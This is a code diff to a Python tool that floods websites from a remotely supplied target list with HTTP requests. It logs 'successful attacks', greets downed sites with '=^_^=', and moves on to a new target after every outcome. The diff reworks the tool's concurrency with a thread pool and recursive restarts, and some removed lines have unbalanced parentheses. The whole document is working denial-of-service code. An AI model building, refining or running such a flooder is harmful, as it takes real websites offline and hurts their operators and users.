@@ -3,6 +3,7 @@ import os
 import platform
 
 from argparse import ArgumentParser
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from gc import collect
 from os import system
 from sys import stderr
@@ -39,6 +40,7 @@ proxy_view = args.proxy_view
 
 remoteProvider = RemoteProvider(args.targets)
 threads = int(args.threads)
+executor = ThreadPoolExecutor()
 
 logger.remove()
 logger.add(
@@ -89,7 +91,7 @@ def mainth(site: str):
                         if response.status_code >= 400:
                             break
                         attacks_number += 1
-                        logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
+                        logger.info(f"Successful attack of {site}; attack count: {attacks_number}; code: {response.status_code}")
         else:
             while (attacks_number < settings.MAX_REQUESTS_TO_SITE):
                 response = scraper.get(site, timeout=10)
@@ -99,17 +101,14 @@ def mainth(site: str):
                 logger.info(f"ATTACKED {site}; attack count: {attacks_number}; RESPONSE CODE: {response.status_code}")
         if attacks_number > 0:
             logger.success("SUCCESSFUL ATTACKS on " + site + ": " + str(attacks_number))
-        logger.info("re-using thread for a new attack")
-        Thread(target=mainth, args=(choice(remoteProvider.get_target_sites())).start()
+        mainth(choice(remoteProvider.get_target_sites()))
     except ConnectionError as exc:
-        logger.success(f"{site} is down")
+        logger.success(f"{site} is down! =^_^=")
         # when thread is about to finish, just re-start its task
-        logger.info("re-using thread for a new attack")
-        Thread(target=mainth, args=(choice(remoteProvider.get_target_sites())).start()
+        mainth(choice(remoteProvider.get_target_sites()))
     except Exception as exc:
-        logger.warning(f"issue happened: {exc}, SUCCESSFUL ATTACKS: {attacks_number}")
-        logger.info("re-using thread for a new attack")
-        Thread(target=mainth, args=(choice(remoteProvider.get_target_sites())).start()
+        logger.warning(f"Error: {exc}; number of successful attacks: {attacks_number}")
+        mainth(choice(remoteProvider.get_target_sites()))
 
 def clear():
     if platform.system() == "Linux":
@@ -135,4 +134,4 @@ if __name__ == '__main__':
     sites = remoteProvider.get_target_sites()
     # initially start as many tasks as configured threads
     for _ in range(threads):
-        Thread(target=mainth, args=(choice(remoteProvider.get_target_sites())).start()
+        executor.submit(mainth, choice(remoteProvider.get_target_sites()))
